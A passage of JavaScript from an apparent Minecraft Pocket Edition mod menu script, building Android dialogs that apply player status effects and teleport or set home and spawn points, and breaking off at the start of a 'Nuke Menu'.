showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn6() {
Entity.addEffect(getPlayerEnt(), MobEffect.weakness, s*l, 0, false, true);
}

var e7 = new Button(ctx);
            e7.setText("Hunger");
            e7.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
eg()
                }
            }));
            emenuLayout.addView(e7);

function eg() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn7();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn7() {
Entity.addEffect(getPlayerEnt(), MobEffect.hunger, s*l, 0, false, true);
}

var e8 = new Button(ctx);
            e8.setText("Night vision");
            e8.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
eh();
                }
            }));
            emenuLayout.addView(e8);

function eh() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn8();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn8() {
Entity.addEffect(getPlayerEnt(), MobEffect.nightVision, s*l, 0, false, true);
}

var e9 = new Button(ctx);
            e9.setText("Blindness");
            e9.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ei();
                }
            }));
            emenuLayout.addView(e9);

function ei() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn9();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn9() {
Entity.addEffect(getPlayerEnt(), MobEffect.blindness, s*l, 0, false, true);
}

var e10 = new Button(ctx);
            e10.setText("Invisibility");
            e10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
 ej();
                }
            }));
            emenuLayout.addView(e10);

function ej() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn10();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn10() {
Entity.addEffect(getPlayerEnt(), MobEffect.invisibility, s*l, 0, false, true);
}

var e11 = new Button(ctx);
            e11.setText("Water breathing");
            e11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ek();
                }
            }));
            emenuLayout.addView(e11);

function ek() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn11();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn11() {
Entity.addEffect(getPlayerEnt(), MobEffect.waterBreathing, s*l, 0, false, true);
}

var e12 = new Button(ctx);
            e12.setText("Fire resistance");
            e12.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
el();
                }
            }));
            emenuLayout.addView(e12);

function el() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn12();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn12() {
Entity.addEffect(getPlayerEnt(), MobEffect.fireResistance, s*l, 0, false, true);
}

var e13 = new Button(ctx);
            e13.setText("Resistance");
            e13.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
em();
                }
            }));
            emenuLayout.addView(e13);

function em() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn13();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn13() {
Entity.addEffect(getPlayerEnt(), MobEffect.damageResistance, s*l, 0, false, true);
}

var e14 = new Button(ctx);
            e14.setText("Regeneration");
            e14.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
en();
                }
            }));
            emenuLayout.addView(e14);

function en() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn14();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn14() {
Entity.addEffect(getPlayerEnt(), MobEffect.regeneration, s*l, 0, false, true);
}

var e15 = new Button(ctx);
            e15.setText("Nausea");
            e15.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
 eo();
                }
            }));
            emenuLayout.addView(e15);

function eo() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn15();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn15() {
Entity.addEffect(getPlayerEnt(), MobEffect.confusion, s*l, 0, false, true);
}

var e16 = new Button(ctx);
            e16.setText("Jump boost");
            e16.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
 ep();
                }
            }));
            emenuLayout.addView(e16);

function ep() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn16();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn16() {
Entity.addEffect(getPlayerEnt(), MobEffect.jump, s*l, 0, false, true);
}

var e17 = new Button(ctx);
            e17.setText("harm");
            e17.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
eq();
                }
            }));
            emenuLayout.addView(e17);

function eq() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn17();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn17() {
Entity.addEffect(getPlayerEnt(), MobEffect.harm, s*l, 0, false, true);
}

var e18 = new Button(ctx);
            e18.setText("heal");
            e18.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
er();
                }
            }));
            emenuLayout.addView(e18);

function er() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn18();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn18() {
Entity.addEffect(getPlayerEnt(), MobEffect.heal, s*l, 0, false, true);
}

var e19 = new Button(ctx);
            e19.setText("Strength");
            e19.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
es();
                }
            }));
            emenuLayout.addView(e19);

function es() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn19();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn19() {
Entity.addEffect(getPlayerEnt(), MobEffect.damageBoost, s*l, 0, false, true);
}

var e20 = new Button(ctx);
            e20.setText("Mining fatigue");
            e20.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
et();
                }
            }));
            emenuLayout.addView(e20);

function et() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn20();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn20() {
Entity.addEffect(getPlayerEnt(), MobEffect.digSlowdown, s*l, 0, false, true);
}

var e21 = new Button(ctx);
            e21.setText("Haste");
            e21.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
eu();
                }
            }));
            emenuLayout.addView(e21);

function eu() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn21();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn21() {
Entity.addEffect(getPlayerEnt(), MobEffect.digSpeed, s*l, 0, false, true);
}

var e22 = new Button(ctx);
            e22.setText("Slowness");
            e22.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ev();
                }
            }));
            emenuLayout.addView(e22);

function ev() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn22();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn22() {
Entity.addEffect(getPlayerEnt(), MobEffect.movementSlowdown, s*l, 0, false, true);
}

var e23 = new Button(ctx);
            e23.setText("Speed boost");
            e23.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ew();
                }
            }));
            emenuLayout.addView(e23);

function ew() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn23();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn23() {
Entity.addEffect(getPlayerEnt(), MobEffect.movementSpeed, s*l, 0, false, true);
}
		
		var D_exit = new android.widget.Button(ctx);
		D_exit.setText("Exit");
		D_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             emenu.dismiss();
showMenuBtn();
			}
		});
		emenuLayout.addView(D_exit);

            emenu = new PopupWindow(emenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            emenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            emenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function TeleMenu() {
ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
        try{
            var tmenuLayout = new android.widget.LinearLayout(ctx);
            var tmenuScroll = new android.widget.ScrollView(ctx);
            var tmenuLayout1 = new android.widget.LinearLayout(ctx);
            tmenuLayout.setOrientation(1);
            tmenuLayout1.setOrientation(1);

            tmenuScroll.addView(tmenuLayout);
            tmenuLayout1.addView(tmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		tmenuLayout.addView(MainTitle);

var titl = new android.widget.TextView(ctx); titl.setGravity(android.view.Gravity.CENTER);
		titl.setText("Teleport Menu");
       titl.setTextColor(GUIName);
		titl.setTextSize(20);
		tmenuLayout.addView(titl);

            var button = new android.widget.Button(ctx);
            button.setText("Select coords");
            button.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Tsele();
tmenu.dismiss();
                }
            }));
            tmenuLayout.addView(button);

var Uspawn = new Button(ctx);
            Uspawn.setText("Set home");       
            Uspawn.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
        xhome=Player.getX();
        yhome=Player.getY()+1;
        zhome=Player.getZ(); 
        save();
clientMessage("§7Home set to: " + Math.round(xhome) + ", " + Math.round(yhome) + ", " + Math.round(zhome) + ".");
                }
            }));
            tmenuLayout.addView(Uspawn);

var Rspawn = new Button(ctx);
            Rspawn.setText("Return to home");       
            Rspawn.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
        load();
clientMessage("§7Returning to your saved home");
                }
            }));
            tmenuLayout.addView(Rspawn);

var sspawn = new Button(ctx);
            sspawn.setText("Set spawn");       
            sspawn.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
        Level.setSpawn(getPlayerX(), getPlayerY(), getPlayerZ())
clientMessage("§7Spawn set to " + Math.round(getPlayerX()) + ", " + Math.round(getPlayerY()) + ", " + Math.round(getPlayerZ()) + ".");
                }
            }));
            tmenuLayout.addView(sspawn);

var gg_exit = new android.widget.Button(ctx);
		gg_exit.setText("Exit");
		gg_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             tmenu.dismiss();
showMenuBtn();
			}
		});
		tmenuLayout.addView(gg_exit);

            tmenu = new android.widget.PopupWindow(tmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
       /*     tmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
tmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            tmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
        }catch(error){
            print("A Error Has Happen: " + error);
        }
    }}));
}

function Tsele() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var X = new android.widget.EditText(ctx);
var Y = new android.widget.EditText(ctx);
var Z = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Type coords to teleport");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(X);
Layer.addView(Y);
Layer.addView(Z);
Layer.addView(Exit);

X.setText("");
X.setHint("X");
Y.setText("");
Y.setHint("Y");
Z.setText("");
Z.setHint("Z");
Exit.setText("Teleport");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
px=X.getText();
py=Y.getText();
pz=Z.getText();
Dialog.dismiss();
set();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Teleport Dialog Is Malfunctioning:"+e);
}
}});
}

function set() {
setPosition(Player.getEntity(), px, py, pz);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/tp " + Player.getName(Player.getEntity()) + space + px + space + py + space + pz);
}

function nmenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var nmenuLayout = new LinearLayout(ctx);
            var nmenuScroll = new ScrollView(ctx);
            var nmenuLayout1 = new LinearLayout(ctx);
            nmenuLayout.setOrientation(1);
            nmenuLayout1.setOrientation(1);
            nmenuScroll.addView(nmenuLayout);
            nmenuLayout1.addView(nmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		nmenuLayout.addView(MainTitle);
            
            var l_title = new android.widget.TextView(ctx); l_title.setGravity(android.view.Gravity.CENTER);
		l_title.setText("Nuke Menu");
       l_title.setTextColor(GUIName);
		l_title.setTextSize(20);
		nmenuLayout.addView(l_title);

var g_exit = new android.widget.Button(ctx);
		g_exit.setText("Exit");
